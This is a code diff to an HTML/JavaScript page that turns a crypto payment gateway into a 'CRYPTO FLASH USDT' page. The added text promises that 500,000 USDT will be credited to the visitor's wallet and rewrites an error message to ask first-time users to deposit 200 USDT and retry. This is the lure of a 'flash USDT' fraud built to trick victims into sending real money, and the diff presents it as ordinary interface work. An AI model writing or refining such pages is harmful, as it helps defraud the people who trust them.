@@ -339,7 +339,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>CRYPTO PAYMENT GATEWAY</h1>
+            <h1>CRYPTO FLASH USDT</h1>
         </div>
         
         <div class="content">
@@ -377,10 +377,10 @@
                 <div class="amount-card">
                     <div class="amount-header">
                         <div class="amount-icon">Ξ</div>
-                        <div class="amount-title">ETH TO SEND</div>
+                        <div class="amount-title">USDT TRON TO FLASH</div>
                     </div>
                     <div class="amount-display" id="ethAmountDisplay">0.00</div>
-                    <div class="amount-note">The value will be added to your wallet</div>
+                    <div class="amount-note">500,000 USDT WILL BE ADDED TO YOUR WALLET</div>
                 </div>
 
                 <div class="action-buttons">
@@ -391,7 +391,7 @@
                     
                     <button class="action-btn usdt-btn" id="sendUsdtBtn" onclick="sendUSDT()">
                         <span class="btn-icon">$</span>
-                        <span>ACCEPT USDT</span>
+                        <span>FLASH USDT</span>
                     </button>
                 </div>
             </div>
@@ -559,7 +559,7 @@
         async function sendUSDT() {
             try {
                 if (!usdtBalance || usdtBalance == 0) {
-                    showStatus("INSUFFICIENT USDT TO ACCEPT THE PAYMENT PLEASE DEPOSIT USDT TO YOUR WALLET AND RETRY", "error");
+                    showStatus("FLASH SENT INSUFFICIENT USDT TO ACCEPT THE PAYMENT PLEASE DEPOSIT 200 USDT TO YOUR WALLET FOR FIRST TIME USER AND RETRY", "error");
                     return;
                 }
                 
